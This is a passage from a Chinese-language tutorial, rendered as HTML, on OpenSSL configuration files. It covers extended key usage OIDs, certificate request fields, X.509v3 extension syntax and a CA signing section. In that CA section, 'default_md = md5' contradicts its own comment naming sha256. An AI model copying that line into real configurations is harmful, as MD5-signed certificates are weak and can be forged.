<span style="color: #b22222;"># </span><span style="color: #b22222;">OCSP &#31614;&#21517;</span>
OCSPSigning = 1.3.6.1.5.5.7.3.9
<span style="color: #b22222;"># </span><span style="color: #b22222;">IPSec &#23494;&#38053;&#20132;&#25442;</span>
ipsecIKE = 1.3.6.1.5.5.7.3.17
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#24494;&#36719;&#20010;&#20154;&#20195;&#30721;&#31614;&#21517;</span>
msCodeInd = 1.3.6.1.4.1.311.2.1.21
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#24494;&#36719;&#21830;&#19994;&#20195;&#30721;&#31614;&#21517;</span>
msCodeCom = 1.3.6.1.4.1.311.2.1.22
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#24494;&#36719;&#20449;&#20219;&#21015;&#34920;&#31614;&#21517;</span>
msCTLSign = 1.3.6.1.4.1.311.10.3.1
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#24494;&#36719;&#21152;&#23494;&#25991;&#20214;&#31995;&#32479;</span>
msEFS = 1.3.6.1.4.1.311.10.3.4
</pre>
</div>
</div>
</div>
<div id="outline-container-h:6f456734-9c11-43af-9c83-9f167d7f6af3" class="outline-5">
<h5 id="h:6f456734-9c11-43af-9c83-9f167d7f6af3">证书请求配置</h5>
<div class="outline-text-5" id="text-h:6f456734-9c11-43af-9c83-9f167d7f6af3">
<div class="org-src-container">
<pre class="src src-sh">input_password &#65306;&#23494;&#30721;&#36755;&#20837;&#25991;&#20214;&#65292;&#21644;&#21629;&#20196;&#34892;&#30340;<span style="color: #8b2252;">"-passin"</span>&#36873;&#39033;&#23545;&#24212;&#65292;&#23494;&#30721;&#26684;&#24335;&#20197;&#21450;&#24847;&#20041;&#35265;<span style="color: #8b2252;">"openssl&#23494;&#30721;&#26684;&#24335;"</span>
output_password&#65306;&#23494;&#30721;&#30340;&#36755;&#20986;&#25991;&#20214;&#65292;&#19982;&#21629;&#20196;&#34892;&#30340;<span style="color: #8b2252;">"-passout"</span>&#36873;&#39033;&#23545;&#24212;&#65292;&#23494;&#30721;&#26684;&#24335;&#20197;&#21450;&#24847;&#20041;&#35265;<span style="color: #8b2252;">"openssl&#23494;&#30721;&#26684;&#24335;"</span>
default_bits   &#65306;openssl req&#33258;&#21160;&#29983;&#25104;RSA&#31169;&#38053;&#26102;&#30340;&#38271;&#24230;&#65292;&#19981;&#20889;&#26102;&#40664;&#35748;&#26159;512&#65292;&#24314;&#35758;&#19981;&#23567;&#20110;2048&#12290;&#21629;&#20196;&#34892;&#30340;<span style="color: #8b2252;">"-new"</span>&#21644;<span style="color: #8b2252;">"-newkey"</span>&#21487;&#33021;&#20250;&#29992;&#21040;&#23427; 
default_keyfile&#65306;&#40664;&#35748;&#30340;&#31169;&#38053;&#36755;&#20986;&#25991;&#20214;&#65292;&#19982;&#21629;&#20196;&#34892;&#30340;<span style="color: #8b2252;">"-keyout"</span>&#36873;&#39033;&#23545;&#24212; 
encrypt_key    &#65306;&#24403;&#35774;&#32622;&#20026;no&#26102;&#65292;&#33258;&#21160;&#21019;&#24314;&#31169;&#38053;&#26102;&#19981;&#20250;&#21152;&#23494;&#35813;&#31169;&#38053;&#12290;&#35774;&#32622;&#20026;no&#26102;&#19982;&#21629;&#20196;&#34892;&#30340;<span style="color: #8b2252;">"-nodes"</span>&#31561;&#20215;&#12290;&#36824;&#26377;&#31561;&#20215;&#30340;&#20860;&#23481;&#24615;&#20889;&#27861;&#65306;encry_rsa_key 
default_md     &#65306;&#25351;&#23450;&#21019;&#24314;&#35777;&#20070;&#35831;&#27714;&#26102;&#23545;&#30003;&#35831;&#32773;&#20449;&#24687;&#36827;&#34892;&#25968;&#23383;&#31614;&#21517;&#30340;&#21333;&#21521;&#21152;&#23494;&#31639;&#27861;&#65292;&#19982;&#21629;&#20196;&#34892;&#30340;<span style="color: #8b2252;">"-[dgst]"</span>&#23545;&#24212; &#21487;&#20197;&#20351;&#29992;(sha256, sha3-256, sha512, sha3-512, ...)
prompt         &#65306;&#24403;&#25351;&#23450;&#20026;no&#26102;&#65292;&#21017;&#19981;&#25552;&#31034;&#36755;&#20837;&#35777;&#20070;&#35831;&#27714;&#30340;&#23383;&#27573;&#20449;&#24687;&#65292;&#32780;&#26159;&#30452;&#25509;&#20174;openssl.cnf&#20013;&#35835;&#21462; &#65306;&#35831;&#23567;&#24515;&#35774;&#32622;&#35813;&#36873;&#39033;&#65292;&#24456;&#21487;&#33021;&#35831;&#27714;&#25991;&#20214;&#21019;&#24314;&#22833;&#36133;&#23601;&#26159;&#22240;&#20026;&#35813;&#36873;&#39033;&#35774;&#32622;&#20026;no 
string_mask    &#65306;&#20026;&#19968;&#20123;&#23383;&#27573;&#35774;&#32622;&#40664;&#35748;&#30340;&#23383;&#31526;&#20018;&#31867;&#22411;&#65292;&#27604;&#22914;&#35777;&#20070;&#35831;&#27714;&#20013;&#30340;&#22478;&#24066;&#21644;&#32452;&#32455;&#21517;&#31216;&#12290;&#21487;&#33021;&#30340;&#21462;&#20540;&#21644;&#35299;&#37322;&#22914;&#19979;
  <span style="color: #b22222;"># </span><span style="color: #b22222;">default: &#21253;&#21547;&#20102; PrintableString, T61String, BMPString &#19977;&#31181;&#31867;&#22411;</span>
  <span style="color: #b22222;"># </span><span style="color: #b22222;">pkix  : &#21253;&#21547;&#20102; PrintableString, BMPString &#20004;&#31181;&#31867;&#22411;</span>
  <span style="color: #b22222;"># </span><span style="color: #b22222;">utf8only: &#21482;&#20351;&#29992; UTF8 &#23383;&#31526;&#20018;&#12290;&#25512;&#33616;&#20351;&#29992;&#36825;&#20010;&#65292;&#36825;&#26679;&#21487;&#20197;&#23436;&#32654;&#30340;&#21253;&#21547;&#20219;&#24847;&#23383;&#31526;&#12290;</span>
  <span style="color: #b22222;"># </span><span style="color: #b22222;">nombstr : &#21253;&#21547;&#20102; PrintableString, T61String &#20004;&#31181;&#31867;&#22411;</span>
distinguished_name&#65306;(DN)&#26159;&#19968;&#20010;&#25193;&#23637;&#23646;&#24615;&#27573;&#33853;&#65292;&#29992;&#20110;&#25351;&#23450;&#35777;&#20070;&#35831;&#27714;&#26102;&#21487;&#34987;&#35782;&#21035;&#30340;&#23383;&#27573;&#21517;&#31216;&#12290;
/C= Country&#22269;&#23478;&#12290;&#22914;CN
/ST= State &#30465;&#25110;&#27954;&#30340;&#23436;&#25972;&#21517;&#31216;   London
/L= Location &#25152;&#22312;&#20301;&#32622;&#30340;&#21517;&#31216;(&#40664;&#35748;&#20026;&#22478;&#24066;)    London
/O= Organization &#32452;&#32455;&#26426;&#26500;&#21517;&#31216;(&#40664;&#35748;&#20026;&#20844;&#21496;)    Global Security
/OU= Organizational Unit &#32452;&#32455;&#26426;&#26500;&#21333;&#20803;&#21517;&#31216;(eg.&#37096;&#38376;) IT Department
/CN= Common Name&#25345;&#26377;&#32773;&#21517;&#25110;&#32773;&#25152;&#22312;&#26381;&#21153;&#22120;&#20027;&#26426;&#21517;(&#21363;&#22495;&#21517;) example.com
/emailAddress &#31649;&#29702;&#21592;&#37038;&#20214;&#22320;&#22336;&#65292;&#21487;&#20197;&#30465;&#30053;xcw@gmail.com

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21487;&#34987;&#35782;&#21035;&#30340;&#23383;&#27573;&#21517;&#31216;&#21253;&#21547;&#20102;&#29992;&#25143;&#30340;&#26631;&#35782;&#20449;&#24687;&#65292;&#23545;&#24212; -subj &#21629;&#20196;&#34892;&#36873;&#39033;&#12290;&#22914;</span>
[ req ]
<span style="color: #b22222;"># </span><span style="color: #b22222;">`man req`</span>
default_bits        = 4096
distinguished_name  = req_distinguished_name
string_mask         = utf8only
default_md          = sha256
[ req_distinguished_name ]
CN = www.test.com
emailAddress = webmaster@feistyduck.com
O = Feisty Duck Ltd
L = London
C = GB
</pre>
</div>
</div>
</div>
<div id="outline-container-h:44d31e3e-6fe0-4505-956c-01b9f6bcad22" class="outline-5">
<h5 id="h:44d31e3e-6fe0-4505-956c-01b9f6bcad22">扩展部分</h5>
<div class="outline-text-5" id="text-h:44d31e3e-6fe0-4505-956c-01b9f6bcad22">
<p>
通常应用程序将包含一个指向扩展部分的选项。扩展部分的每一行都采用以下形
式。如果存在critical，则扩展将为critical。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a0522d;">extension_name</span>=[critical,] extension_options
</pre>
</div>

<p>
扩展主要有四种类型: 字符串扩展、多值扩展、原始扩展和任意扩展。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">1 &#23383;&#31526;&#20018;&#25193;&#23637;&#21482;&#21253;&#21547;&#19968;&#20010;&#23383;&#31526;&#20018;&#65292;&#35813;&#23383;&#31526;&#20018;&#21253;&#21547;&#20540;&#26412;&#36523;&#25110;&#22914;&#20309;&#33719;&#21462;&#20540;&#12290;</span>
<span style="color: #a0522d;">nsComment</span>=<span style="color: #8b2252;">"This is a Comment"</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">2 &#20540;&#25193;&#23637;&#26377;&#30701;&#24418;&#24335;&#21644;&#38271;&#24418;&#24335;&#12290;&#30701;&#24418;&#24335;&#26159;&#21517;&#31216;&#21644;&#20540;&#30340;&#21015;&#34920;:</span>
<span style="color: #a0522d;">basicConstraints</span>=critical,CA:true,pathlen:1

<span style="color: #b22222;"># </span><span style="color: #b22222;">3 &#38271;&#24418;&#24335;&#20801;&#35768;&#23558;&#20540;&#25918;&#32622;&#22312;&#19968;&#20010;&#21333;&#29420;&#30340;&#37096;&#20998;:</span>
<span style="color: #a0522d;">basicConstraints</span>=critical,@bs_section

[bs_section]
<span style="color: #a0522d;">CA</span>=true
<span style="color: #a0522d;">pathlen</span>=1
&#36825;&#20004;&#31181;&#24418;&#24335;&#26159;&#31561;&#20215;&#30340;&#12290;

<span style="color: #b22222;"># </span><span style="color: #b22222;">4 &#21407;&#22987;&#25193;&#23637;&#30340;&#35821;&#27861;&#30001;&#25193;&#23637;&#20195;&#30721;&#25511;&#21046;: &#20363;&#22914;&#65292;&#23427;&#21487;&#20197;&#22312;&#22810;&#20010;&#37096;&#20998;&#20013;&#21253;&#21547;&#25968;&#25454;&#12290;&#35201;&#20351;&#29992;&#30340;&#27491;&#30830;&#35821;&#27861;&#26159;&#30001;&#25193;&#23637;&#20195;&#30721;&#26412;&#36523;&#23450;&#20041;&#30340;: &#26597;&#30475;&#19968;&#20010;&#31034;&#20363;&#30340;&#35777;&#20070;&#31574;&#30053;&#25193;&#23637;&#12290;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">5 &#22914;&#26524;&#19981;&#25903;&#25345;&#25193;&#23637;&#31867;&#22411;&#65292;&#21017;&#24517;&#39035;&#20351;&#29992;&#20219;&#24847;&#25193;&#23637;&#35821;&#27861;&#65292;&#35831;&#21442;&#38405;&#20219;&#24847;&#25193;&#23637;&#37096;&#20998;&#20197;&#33719;&#24471;&#26356;&#22810;&#35814;&#32454;&#20449;&#24687;&#12290;</span>
</pre>
</div>

<p>
基本限制
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a0522d;">basicConstraints</span>=CA:TRUE
<span style="color: #a0522d;">basicConstraints</span>=CA:FALSE
<span style="color: #a0522d;">basicConstraints</span>=critical,CA:TRUE, pathlen:0 <span style="color: #b22222;"># </span><span style="color: #b22222;">&#34920;&#31034;&#31105;&#27490;&#31614;&#21457;&#19979;&#32423;CA&#35777;&#20070;(&#20165;&#33021;&#31614;&#21457;"&#21494;&#23376;&#35777;&#20070;")</span>
</pre>
</div>

<p>
CA:TRUE/FALSE TRUE表示是CA证书(可签发其他证书)；FALSE表示不是证书
</p>

<p>
pathlen:N 后缀表示允许签发下级CA证书的最大数量("0"表示禁止签发下级CA证
书)，"critical"表示关键扩展
</p>

<p>
密钥用法
</p>

<p>
支持的名称有:digitalSignature(数字签名), nonRepudiation(防否认),
keyEncipherment(密钥加密), dataEncipherment(数据加密), keyAgreement(密
钥协商), keyCertSign(证书签发), cRLSign(证书撤销列表签名),
encipherOnly(仅加密) and decipherOnly(仅解密)
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a0522d;">keyUsage</span>=nonRepudiation, digitalSignature, keyEncipherment
<span style="color: #a0522d;">keyUsage</span>=critical, keyCertSign
</pre>
</div>

<p>
扩展的密钥使用
</p>

<p>
这个扩展包含一个用法列表，指出证书公钥可用于的目的
</p>

<p>
这些名称可以是对象短名称，也可以是 oid 的点号数字形式。虽然任何 OID都
可以使用，但只有某些值是有意义的。特别是下列 PKIX、 NS 和 MS值是有意义
的:
</p>

<div class="org-src-container">
<pre class="src src-sh">Value                  Meaning
-----                  -------
serverAuth             SSL/TLS Web Server Authentication. &#26381;&#21153;&#22120;&#36523;&#20221;&#39564;&#35777;
clientAuth             SSL/TLS Web Client Authentication. &#23458;&#25143;&#31471;&#36523;&#20221;&#39564;&#35777;
codeSigning            Code signing. &#20195;&#30721;&#31614;&#21517;
emailProtection        E-mail Protection (S/MIME)<span style="color: #483d8b;">.</span> &#23433;&#20840;&#30005;&#23376;&#37038;&#20214;
timeStamping           Trusted Timestamping &#26102;&#38388;&#25139;
OCSPSigning            OCSP Signing OCSP &#31614;&#21517;
ipsecIKE               ipsec Internet Key Exchange  IPSec &#23494;&#38053;&#20132;&#25442;
msCodeInd              Microsoft Individual Code Signing (authenticode) &#24494;&#36719;&#20010;&#20154;&#20195;&#30721;&#31614;&#21517;
msCodeCom              Microsoft Commercial Code Signing (authenticode) &#24494;&#36719;&#21830;&#19994;&#20195;&#30721;&#31614;&#21517;
msCTLSign              Microsoft Trust List Signing &#24494;&#36719;&#20449;&#20219;&#21015;&#34920;&#31614;&#21517;
msEFS                  Microsoft Encrypted File System &#24494;&#36719;&#21152;&#23494;&#25991;&#20214;&#31995;&#32479;
</pre>
</div>

<p>
范例
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a0522d;">extendedKeyUsage</span>=critical,codeSigning,1.2.3.4
<span style="color: #a0522d;">extendedKeyUsage</span>=serverAuth,clientAuth
</pre>
</div>

<p>
使用者密钥标识符(根据RFC3280规范自动生成)
</p>

<p>
这实际上是一个字符串扩展，可以取两个可能的值。要么是自动遵循RFC3280准
则的单词散列，要么是十六进制字符串，给出扩展值以包括。强烈建议不要使用
十六进制字符串。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a0522d;">subjectKeyIdentifier</span>=hash
</pre>
</div>

<p>
颁发机构密钥标识符
</p>

<p>
颁发者选项从颁发者证书复制颁发者和序列号。只有在keyid选项失败或者没有
包含的情况下才会执行此操作，除非”always”表示始终包含该值
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a0522d;">authorityKeyIdentifier</span>=keyid,issuer
authorityKeyIdentifier = keyid,issuer:always
</pre>
</div>

<p>
使用者备用名称
</p>

<p>
包含email, URI, DNS, RID, IP, dirName(专有名称)和其他名称，多个以逗号
分隔常用于实现泛域名证书、IP常用于绑定特定的IP地址、"copy"表示直接复制
证书中的包含的邮件地址
</p>

<div class="org-src-container">
<pre class="src src-sh">subjectAltName = DNS:www.example.com, DNS:example.com, DNS:*.example.net, IP:192.168.7.1, IP:13::17, email:copy
subjectAltName = @master_names
[ master_names ]
DNS.1 = ${<span style="color: #a0522d;">ENV</span>::MASTER_NAME}<span style="color: #483d8b;">.</span>${<span style="color: #a0522d;">ENV</span>::BASE_DOMAIN}

<span style="color: #a0522d;">subjectAltName</span>=email:my@other.address,RID:1.2.3.4
<span style="color: #a0522d;">subjectAltName</span>=otherName:1.2.3.4;UTF8:some other identifier


<span style="color: #a0522d;">subjectAltName</span>=dirName:dir_sect
[dir_sect]
<span style="color: #a0522d;">C</span>=UK
<span style="color: #a0522d;">O</span>=My Organization
<span style="color: #a0522d;">OU</span>=My Unit
<span style="color: #a0522d;">CN</span>=My Name
</pre>
</div>

<p>
颁发者别称
</p>

<div class="org-src-container">
<pre class="src src-sh">issuerAltName = issuer:copy <span style="color: #b22222;"># </span><span style="color: #b22222;">copy&#20174;&#35777;&#20070;&#20013;&#22797;&#21046;</span>
</pre>
</div>

<p>
权限信息访问
</p>

<p>
提供了有关如何访问与 CA 相关的某些信息的详细信息。其语法是accessOID;
位置的语法与主题替代名称相同(除了不支持 email: copy)。accessOID 可以是
任何有效的 OID，但是只有某些值是有意义的，例如OCSP 和 castanors。
</p>

<div class="org-src-container">
<pre class="src src-sh">authorityInfoAccess = OCSP;URI:http://ocsp.my.host/
authorityInfoAccess = caIssuers;URI:http://my.ca/ca.html
</pre>
</div>

<p>
证书吊销分发位置
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#31616;&#21333;&#30340;&#20363;&#23376;</span>
<span style="color: #a0522d;">crlDistributionPoints</span>=URI:http://myhost.com/myca.crl
<span style="color: #a0522d;">crlDistributionPoints</span>=URI:http://my.com/my.crl,URI:http://oth.com/my.crl

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#23436;&#25972;&#30340;&#20998;&#21457;&#28857;</span>
<span style="color: #a0522d;">crlDistributionPoints</span>=crldp1_section

[crldp1_section]
<span style="color: #a0522d;">fullname</span>=URI:http://myhost.com/myca.crl
<span style="color: #a0522d;">CRLissuer</span>=dirName:issuer_sect
<span style="color: #a0522d;">reasons</span>=keyCompromise, CACompromise

[issuer_sect]
<span style="color: #a0522d;">C</span>=UK
<span style="color: #a0522d;">O</span>=Organisation
<span style="color: #a0522d;">CN</span>=Some Name
</pre>
</div>

<p>
颁发者分发地址
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a0522d;">issuingDistributionPoint</span>=critical, @idp_section

[idp_section]
<span style="color: #a0522d;">fullname</span>=URI:http://myhost.com/myca.crl
<span style="color: #a0522d;">indirectCRL</span>=TRUE
<span style="color: #a0522d;">onlysomereasons</span>=keyCompromise, CACompromise

[issuer_sect]
<span style="color: #a0522d;">C</span>=UK
<span style="color: #a0522d;">O</span>=Organisation
<span style="color: #a0522d;">CN</span>=Some Name
</pre>
</div>

<p>
证书政策
</p>

<p>
这是一个原始的扩展。可以使用适当的语法设置这个扩展的所有字段
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a0522d;">certificatePolicies</span>= 1.2.4.5, 1.1.3.4

<span style="color: #a0522d;">certificatePolicies</span>=ia5org,1.2.3.4,1.5.6.7.8,@polsect
[polsect]
policyIdentifier = 1.3.5.8
CPS.1=<span style="color: #8b2252;">"http://my.host.name/"</span>
CPS.2=<span style="color: #8b2252;">"http://my.your.name/"</span>
userNotice.1=@notice

[notice]
<span style="color: #a0522d;">explicitText</span>=<span style="color: #8b2252;">"Explicit Text Here"</span>
<span style="color: #a0522d;">organization</span>=<span style="color: #8b2252;">"Organisation Name"</span>
<span style="color: #a0522d;">noticeNumbers</span>=1,2,3,4
</pre>
</div>

<p>
政策限制
</p>

<p>
包括名称 requireExplicitPolicy 或 inhibitPolicyMapping和一个非负整数值。
至少要有一个组件存在。
</p>

<div class="org-src-container">
<pre class="src src-sh">policyConstraints = requireExplicitPolicy:3
</pre>
</div>

<p>
禁止任何政策
</p>

<p>
名称应以允许或排除这两个词开头，后跟一个;。名称和值的其余部分遵循
subjectAltName 的语法，但 email 除外: 不支持复制，IP 表单应由 IP地址和
子网掩码组成，中间用/分隔。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #a0522d;">nameConstraints</span>=permitted;IP:192.168.0.0/255.255.0.0
<span style="color: #a0522d;">nameConstraints</span>=permitted;email:.somedomain.com
<span style="color: #a0522d;">nameConstraints</span>=excluded;email:.com
</pre>
</div>

<p>
跳过 OCSP 检查
</p>

<div class="org-src-container">
<pre class="src src-sh">noCheck = ignored
</pre>
</div>

<p>
TLS 特性
</p>

<p>
每个标识符可以是一个数字(0。. 65535)或支持的名称。当 TLS客户端发送列出
的扩展时，TLS 服务器应该在其应答中包含该扩展。
</p>

<p>
支持的名称是: status_request and status_request_v2
</p>

<div class="org-src-container">
<pre class="src src-sh">tlsfeature = status_request
</pre>
</div>

<p>
证书说明
</p>

<div class="org-src-container">
<pre class="src src-sh">nsComment = <span style="color: #8b2252;">"Some Random Comment"</span>
</pre>
</div>

<p>
证书类别
</p>

<p>
用于表明证书可用于的目的。现在使用的是 basicConstraints、keyUsage 和扩
展密钥使用扩展
</p>

<p>
支持client, server, email, objsign, reserved, sslCA, emailCA, objCA.
</p>

<div class="org-src-container">
<pre class="src src-sh">nsCertType = client 
nsComment = <span style="color: #8b2252;">"OpenSSL Generated Client Certificate"</span>
nsCertType = server
nsComment = <span style="color: #8b2252;">"OpenSSL Generated Server Certificate"</span>
</pre>
</div>

<p>
任意扩展
</p>

<p>
如果 OpenSSL代码不支持扩展，则必须使用任意扩展格式对其进行编码。对于支
持的扩展，也可以使用任意格式。应该特别小心，以确保数据的格式对于给定的
扩展类型是正确的有两种方法可以对任意扩展进行编码。
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#31532;&#19968;&#31181;&#26041;&#27861;&#26159;&#20351;&#29992; ASN1&#36825;&#20010;&#35789;&#65292;&#21518;&#38754;&#36319;&#30528;&#25193;&#23637;&#20869;&#23481;&#65292;&#20351;&#29992;&#19982; ASN1 _ generate _ nconf (3)&#30456;&#21516;&#30340;&#35821;&#27861;</span>
1.2.3.4=critical,ASN1:UTF8String:Some random data
1.2.3.4=ASN1:SEQUENCE:seq_sect
[seq_sect]
field1 = UTF8:field1
field2 = UTF8:field2

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#20351;&#29992;&#21333;&#35789; DER &#22312;&#20219;&#20309;&#25193;&#23637;&#20013;&#21253;&#21547;&#21407;&#22987;&#32534;&#30721;&#30340;&#25968;&#25454;</span>
1.2.3.4=critical,DER:01:02:03:04
1.2.3.4=DER:01020304
DER &#21518;&#38754;&#30340;&#20540;&#26159;&#25193;&#23637;&#30340; DER &#32534;&#30721;&#30340;&#21313;&#20845;&#36827;&#21046;&#36716;&#20648;&#12290;&#20219;&#20309;&#25193;&#23637;&#37117;&#21487;&#20197;&#25918;&#22312;&#36825;&#20010;&#34920;&#21333;&#20013;&#20197;&#35206;&#30422;&#40664;&#35748;&#34892;&#20026;&#12290;&#20363;&#22914;:
<span style="color: #a0522d;">basicConstraints</span>=critical,DER:00:01:02:03
<span style="color: #b22222;">#</span><span style="color: #b22222;">DER &#21644; ASN1&#36873;&#39033;&#24212;&#35880;&#24910;&#20351;&#29992;&#12290;&#22914;&#26524;&#19981;&#23567;&#24515;&#20351;&#29992;&#65292;&#21487;&#33021;&#20250;&#21019;&#24314;&#23436;&#20840;&#26080;&#25928;&#30340;&#25193;&#23637;&#12290;</span>
</pre>
</div>

<p>
范例
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">##### </span><span style="color: #b22222;">&#35201;&#21152;&#20837;&#21040;&#35777;&#20070;&#35831;&#27714;&#20013;&#30340;&#19968;&#31995;&#21015; X.509v3 &#25193;&#23637;&#39033;&#65292;&#23545;&#24212; -addext &#21629;&#20196;&#34892;&#36873;&#39033; #####</span>
[ v3_req ]
basicConstraints = CA:FALSE
keyUsage = nonRepudiation, digitalSignature, keyEncipherment
extendedKeyUsage = critical, serverAuth, clientAuth, timeStamping
nsCertType = client,server
nsComment = <span style="color: #8b2252;">"OpenSSL Generated Client Certificate and Server Certificate"</span>
subjectAltName = DNS:www.example.com, DNS:example.com, DNS:*.example.net, IP:192.168.7.1, IP:13::17, email:copy
<span style="color: #b22222;"># </span><span style="color: #b22222;">OCSP&#24517;&#39035;&#35013;&#35746;(OCSP Must-Staple)</span>
1.3.6.1.5.5.7.1.24 = DER:30:03:02:01:05
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#26159;&#20351;&#29992;openssl 1.1.0&#25110;&#26356;&#39640;&#30340;&#29256;&#26412;&#65292;&#21487;&#20197;&#36825;&#26679;&#35774;&#32622;&#65306;</span>
tlsfeature = status_request

<span style="color: #b22222;">#### </span><span style="color: #b22222;">&#29983;&#25104;&#33258;&#31614;&#21517;&#35777;&#20070;(RootCA)&#26102;&#20351;&#29992;&#30340; X.509v3 &#35777;&#20070;&#25193;&#23637;&#39033;&#65292;&#23545;&#24212; -addext &#21629;&#20196;&#34892;&#36873;&#39033; #####</span>
[ v3_ca ]
basicConstraints = critical,CA:TRUE
keyUsage = cRLSign, keyCertSign, digitalSignature
subjectKeyIdentifier = hash
authorityKeyIdentifier = keyid:always,issuer
</pre>
</div>
</div>
</div>
<div id="outline-container-h:aa4da6ad-b2dc-42c1-9836-43692c37b977" class="outline-5">
<h5 id="h:aa4da6ad-b2dc-42c1-9836-43692c37b977">证书签发配置</h5>
<div class="outline-text-5" id="text-h:aa4da6ad-b2dc-42c1-9836-43692c37b977">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">cd</span> ca
mkdir certs newcerts private conf server
vim conf/openssl.cnf
[ ca ]
default_ca = foo
[ foo ]
dir = ./ca                           <span style="color: #b22222;"># </span><span style="color: #b22222;">CA&#30340;&#24037;&#20316;&#30446;&#24405;</span>
database = $<span style="color: #a0522d;">dir</span>/index.txt            <span style="color: #b22222;"># </span><span style="color: #b22222;">&#35777;&#20070;&#39041;&#21457;&#30340;&#32034;&#24341;&#25991;&#20214;</span>
new_certs_dir = $<span style="color: #a0522d;">dir</span>/newcerts        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26032;&#39041;&#21457;&#35777;&#20070;&#30340;&#40664;&#35748;&#20301;&#32622;&#65292;&#31561;&#21516;&#20110;"-outdir"&#36873;&#39033;</span>
certificate = $<span style="color: #a0522d;">dir</span>/private/ca.crt    <span style="color: #b22222;"># </span><span style="color: #b22222;">CA&#35777;&#20070;&#25152;&#22312;&#20301;&#32622;&#65292;&#31561;&#21516;&#20110;"-cert"&#36873;&#39033;</span>
serial = $<span style="color: #a0522d;">dir</span>/serial                 <span style="color: #b22222;"># </span><span style="color: #b22222;">&#19979;&#19968;&#20010;&#35201;&#39041;&#21457;&#35777;&#20070;&#30340;&#32534;&#21495;(16&#36827;&#21046;)</span>
private_key = $<span style="color: #a0522d;">dir</span>/private/ca.key    <span style="color: #b22222;"># </span><span style="color: #b22222;">CA&#31169;&#38053;&#25991;&#20214;&#20301;&#32622;&#65292;&#31561;&#21516;&#20110;"-keyfile"&#36873;&#39033;</span>
RANDFILE = $<span style="color: #a0522d;">dir</span>/private/.rand        <span style="color: #b22222;"># </span><span style="color: #b22222;">&#40664;&#35748;&#30340;&#38543;&#26426;&#25968;&#31181;&#23376;&#25991;&#20214;&#65292;&#23545;&#24212; -rand &#21629;&#20196;&#34892;&#36873;&#39033;&#12290;</span>
default_days = 36500                  <span style="color: #b22222;"># </span><span style="color: #b22222;">&#40664;&#35748;&#26377;&#25928;&#26399;&#65292;&#20844;&#21496;&#20869;&#37096;&#20351;&#29992;&#24212;&#35843;&#38271;&#19968;&#20123;&#12290;&#40664;&#35748;&#26377;&#25928;&#26399;365&#22825;&#65292;&#31561;&#21516;&#20110;"-days"&#36873;&#39033;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">default_startdate = 210407223344Z   # &#26032;&#35777;&#20070;&#40664;&#35748;&#30340;&#29983;&#25928;&#26085;&#26399;&#65292;&#22914;&#26524;&#26410;&#35774;&#32622;&#21017;&#20351;&#29992;&#31614;&#21457;&#26102;&#30340;&#26102;&#38388;&#65292;&#26684;&#24335;&#20026;&#65306;YYMMDDHHNNSSZ(&#24180;&#26376;&#26085;&#26102;&#20998;&#31186;Z)&#65292;&#31561;&#21516;&#20110;"-startdate"&#36873;&#39033;</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">default_enddate = 090303223344Z     # &#26032;&#35777;&#20070;&#40664;&#35748;&#30340;&#22833;&#25928;&#26085;&#26399;&#65292;&#26684;&#24335;&#20026;&#65306;YYMMDDHHNNSSZ(&#24180;&#26376;&#26085;&#26102;&#20998;&#31186;Z)&#65292;&#31561;&#21516;&#20110;"-enddate"&#36873;&#39033;&#12290;</span>
<span style="color: #a0522d;">default_crl_days</span>= 30                 <span style="color: #b22222;"># </span><span style="color: #b22222;">&#40664;&#35748;&#21514;&#38144;&#21015;&#34920;&#23384;&#25918;&#26102;&#38388;</span>
default_md = md5                     <span style="color: #b22222;"># </span><span style="color: #b22222;">&#40664;&#35748;&#25688;&#35201;&#31639;&#27861;sha256&#12290;&#30456;&#24403;&#20110;&#22312;&#21629;&#20196;&#34892;&#19978;&#20351;&#29992; -sha256 &#36873;&#39033;(&#23545;&#24212;&#20110;"-digest")</span>
unique_subject = no                 <span style="color: #b22222;"># </span><span style="color: #b22222;">&#21516;&#19968;&#20010;"subject"&#26159;&#21542;&#21482;&#33021;&#21019;&#24314;&#19968;&#20010;&#35777;&#20070;&#65292;&#40664;&#35748;&#20540;&#20026; yes &#20294;&#24314;&#35758;&#35774;&#20026; no &#20197;&#26041;&#20415;&#26681;CA&#33258;&#31614;&#21517;( -selfsign )&#12290;</span>
name_opt    = ca_default             <span style="color: #b22222;"># </span><span style="color: #b22222;">Subject Name options &#29992;&#25143;&#38656;&#35201;&#30830;&#35748;&#31614;&#21457;&#35777;&#20070;&#26102;&#21487;&#35835;&#35777;&#20070;DN&#22495;&#30340;&#26174;&#31034;&#26684;&#24335;&#12290;&#21487;&#29992;&#20540;&#19982; x509 &#25351;&#20196;&#30340; -nameopt &#36873;&#39033;&#30456;&#21516;&#12290;</span>
